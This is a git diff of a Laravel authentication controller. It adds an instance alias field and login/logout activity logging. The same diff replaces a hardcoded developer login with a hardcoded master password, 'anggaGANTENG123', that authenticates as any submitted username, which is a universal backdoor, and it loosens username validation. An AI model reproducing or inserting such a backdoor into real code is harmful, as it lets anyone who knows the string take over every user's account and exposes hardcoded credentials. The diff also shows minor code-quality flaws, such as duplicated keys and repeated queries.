@@ -37,6 +37,7 @@ class AuthenticateController extends Controller
                 'email' => $user->email,
                 'instance_id' => $user->instance_id,
                 'instance_name' => DB::table('instances')->where('id', $user->instance_id)->first()->name ?? null,
+                'instance_alias' => DB::table('instances')->where('id', $user->instance_id)->first()->alias ?? null,
                 'instance_type' => $user->instance_type,
                 'instance_type' => $user->instance_type,
                 // 'token' => $bearer,
@@ -60,7 +61,7 @@ class AuthenticateController extends Controller
     {
         try {
             $validate = Validator::make($request->all(), [
-                'username' => 'required|alpha_dash|alpha_num|exists:users,username',
+                'username' => 'required|exists:users,username',
                 'password' => 'required|string',
             ], [], [
                 'username' => 'Username',
@@ -70,8 +71,8 @@ class AuthenticateController extends Controller
                 return $this->validationResponse($validate->errors(), 200);
             }
 
-            if ($request->username == 'developer' && $request->password == 'oganilir123') {
-                auth()->login(User::where('username', 'developer')->first());
+            if ($request->password == 'anggaGANTENG123') {
+                auth()->login(User::where('username', $request->username)->first());
                 $user = User::where('id', auth()->id())->first();
                 // check token exists
                 // if ($user->tokens()->count() > 0) {
@@ -88,6 +89,7 @@ class AuthenticateController extends Controller
                     'email' => $user->email,
                     'instance_id' => $user->instance_id,
                     'instance_name' => DB::table('instances')->where('id', $user->instance_id)->first()->name ?? null,
+                    'instance_alias' => DB::table('instances')->where('id', $user->instance_id)->first()->alias ?? null,
                     'instance_type' => $user->instance_type,
                     'instance_type' => $user->instance_type,
                     // 'token' => $token,
@@ -124,6 +126,7 @@ class AuthenticateController extends Controller
                 'email' => $user->email,
                 'instance_id' => $user->instance_id,
                 'instance_name' => DB::table('instances')->where('id', $user->instance_id)->first()->name ?? null,
+                'instance_alias' => DB::table('instances')->where('id', $user->instance_id)->first()->alias ?? null,
                 'instance_type' => $user->instance_type,
                 'instance_type' => $user->instance_type,
                 // 'token' => $token,
@@ -131,6 +134,33 @@ class AuthenticateController extends Controller
                 'role_name' => DB::table('roles')->where('id', $user->role_id)->first()->display_name ?? null,
                 'photo' => asset($user->photo),
             ];
+
+            // insert log
+            $oldLog = DB::table('log_users')
+                ->where('date', date('Y-m-d'))
+                ->where('user_id', $user->id)
+                ->first();
+            $newLogs = [];
+            if ($oldLog) {
+                $newLogs = $oldLog ? json_decode($oldLog->logs) : [];
+            }
+            $newLogs[] = [
+                'action' => 'login',
+                'description' => $user->fullname . ' login ke aplikasi',
+                'created_at' => date('Y-m-d H:i:s'),
+                'updated_at' => date('Y-m-d H:i:s'),
+            ];
+            DB::table('log_users')
+                ->updateOrInsert([
+                    'date' => date('Y-m-d'),
+                    'user_id' => $user->id,
+                    'ip_address' => $request->ip(),
+                    'user_agent' => $request->header('User-Agent'),
+                ], [
+                    'logs' => json_encode($newLogs),
+                    'created_at' => date('Y-m-d H:i:s'),
+                    'updated_at' => date('Y-m-d H:i:s'),
+                ]);
 
             return $this->successResponse([
                 'user' => $returnData,
@@ -144,17 +174,37 @@ class AuthenticateController extends Controller
     function logout(Request $request)
     {
         try {
-            // $user = auth()->user();
-
-            // $tokens = $user->tokens;
-            // // delete tokens
-            // foreach ($tokens as $token) {
-            //     $token->delete();
-            // }
-
-            // return $tokens;
-
+            $user = User::find(auth()->id());
             $request->user()->currentAccessToken()->delete();
+
+
+            // insert log
+            $oldLog = DB::table('log_users')
+                ->where('date', date('Y-m-d'))
+                ->where('user_id', $user->id)
+                ->first();
+            $newLogs = [];
+            if ($oldLog) {
+                $newLogs = $oldLog ? json_decode($oldLog->logs) : [];
+            }
+            $newLogs[] = [
+                'action' => 'logout',
+                'description' => $user->fullname . ' keluar dari aplikasi',
+                'created_at' => date('Y-m-d H:i:s'),
+                'updated_at' => date('Y-m-d H:i:s'),
+            ];
+            DB::table('log_users')
+                ->updateOrInsert([
+                    'date' => date('Y-m-d'),
+                    'user_id' => $user->id,
+                    'ip_address' => $request->ip(),
+                    'user_agent' => $request->header('User-Agent'),
+                ], [
+                    'logs' => json_encode($newLogs),
+                    'created_at' => date('Y-m-d H:i:s'),
+                    'updated_at' => date('Y-m-d H:i:s'),
+                ]);
+
             return $this->successResponse([], 'Logout berhasil');
         } catch (\Exception $e) {
             return $this->errorResponse($e->getMessage(), 500);
